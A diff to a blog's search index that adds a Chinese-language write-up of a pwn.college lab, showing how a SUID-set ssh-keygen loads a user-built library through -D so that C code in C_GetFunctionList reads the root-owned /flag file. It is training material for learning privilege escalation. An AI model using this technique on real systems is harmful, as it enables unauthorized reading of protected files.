@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>ssh-keygen提权</title>
+      <link href="/posts/1ca7db7c/"/>
+      <url>/posts/1ca7db7c/</url>
+      
+        <content type="html"><![CDATA[<p>pwn.college的level51卡了好久，写文章记录一下做题过程</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>suid(set uid)是linux中的一种特殊权限，suid可以让调用者以文件拥有者身份运行该文件，所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。</p><p>suid特点是用户运行某个程序时，如果该程序有suid权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。</p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>运行challenge目录下的babysuid_level51，题目告诉我们ssh-keygen设置了suid位，并给了要加载自己的代码的提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This challenge is part of a series of programs that</span><br><span class="line">show you how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part!).</span><br><span class="line"></span><br><span class="line">I just set the SUID bit on /usr/bin/ssh-keygen.</span><br><span class="line">Try to use it to read the flag!</span><br></pre></td></tr></table></figure><p><code>ssh-keygen -D ./</code>可以加载动态链接库文件，所以我们就编写一个动态链接库看看</p><p><code>ls -l</code>or<code>ll</code>查看目录权限，发现hacker用户(用户)在<code>home/hacker</code>目录下有rwx权限</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202402280056786.png" alt="目录权限"></p><p><code>cd home/hacker</code>进入hacker目录，<code>touch test.c</code>创建c文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc test.c -shared -o test.so </code>编译动态链接库</p><h1 id="易出错点"><a href="#易出错点" class="headerlink" title="易出错点"></a>易出错点</h1><p><code>ssh-keygen -D ./test.so</code>加载动态链接库，然后会出现如下报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test.so does not contain expected string C_GetFunctionList</span><br><span class="line">provider test.so is not a PKCS11 library</span><br><span class="line">cannot read public key from pkcs11</span><br></pre></td></tr></table></figure><p>报错提示我们test.so不包含字符串C_GetFunctionList(test.so does not contain expected string C_GetFunctionList)，只需让我们的test.c包含字符串C_GetFunctionList即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">C_GetFunctionList</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新执行上述命令，成功让ssh-keygen执行了代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hello world</span><br><span class="line">C_GetFunctionList for provider ./test.so failed: 12</span><br><span class="line">cannot read public key from pkcs11</span><br></pre></td></tr></table></figure><p>修改代码使其读取flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">C_GetFunctionList</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">256</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/flag&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    read(fd,buf,<span class="number">256</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwn.college&#123;xxxxxx&#125;</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><p><a href="https://xz.aliyun.com/t/12535?time__1311=mqmhD50KBKDK50Hq4+2=8G8Y=P5QwD&alichlgref=https://www.google.com/#toc-13">浅谈linux suid提权</a></p></li><li><p><a href="https://pwn.college/fundamentals/program-misuse">Program Misuse</a></p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn.college </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> suid </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>error spawn failed报错</title>
       <link href="/posts/159ace20/"/>
       <url>/posts/159ace20/</url>
@@ -406,17 +431,6 @@
     
     
     <entry>
-      <title>about</title>
-      <link href="/about/index.html"/>
-      <url>/about/index.html</url>
-      
-        <content type="html"><![CDATA[<p>菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜鸡Pwn手</p>]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>categories</title>
       <link href="/categories/index.html"/>
       <url>/categories/index.html</url>
@@ -428,11 +442,11 @@
     
     
     <entry>
-      <title>link</title>
-      <link href="/link/index.html"/>
-      <url>/link/index.html</url>
+      <title>about</title>
+      <link href="/about/index.html"/>
+      <url>/about/index.html</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<p>菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜鸡Pwn手</p>]]></content>
       
     </entry>
     
@@ -442,6 +456,17 @@
       <title>tags</title>
       <link href="/tags/index.html"/>
       <url>/tags/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>link</title>
+      <link href="/link/index.html"/>
+      <url>/link/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
